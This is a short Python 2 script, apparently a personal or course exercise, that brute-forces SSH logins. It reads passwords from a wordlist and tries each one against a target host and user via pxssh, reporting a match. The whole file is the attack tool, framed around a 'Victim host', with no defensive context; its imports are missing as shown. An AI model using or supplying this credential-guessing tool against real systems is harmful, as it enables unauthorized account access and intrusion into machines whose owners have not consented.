#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Sun May 27 17:11:52 2018

@author: root
"""
    
    

def connect(hostname, user, password):
    try:
        s=pxssh.pxssh()
        s.login(hostname, user, password)
        print("[+] Password Found For User "+ str(user)+": "+str(password))
        return True
    except:
        return False
    
def main():
    parser=argparse.ArgumentParser(description="Process the Victim host")
    parser.add_argument("Host", help="Specify the target Host")
    parser.add_argument("PasswordFile", help="Specify the Password File")
    parser.add_argument("User", help="Specify the Username")
    args=parser.parse_args()
    tgtHost=args.Host
    tgtFile=args.PasswordFile
    tgtUser=args.User
    if tgtHost==None or tgtFile==None or tgtUser==None:
        print parser.usage
        exit(0)
    passwordfile=open(tgtFile,'r')
#    combination={}
    for password in passwordfile.readlines():
        print("[-] Testing: "+str(password))
        result=connect(tgtHost, tgtUser, password)
        if result:
            print("[+] Exiting: Pasword Found")
            exit(0)
    print("[-]Password Not Found")
    

if __name__ == "__main__":
    main()

    
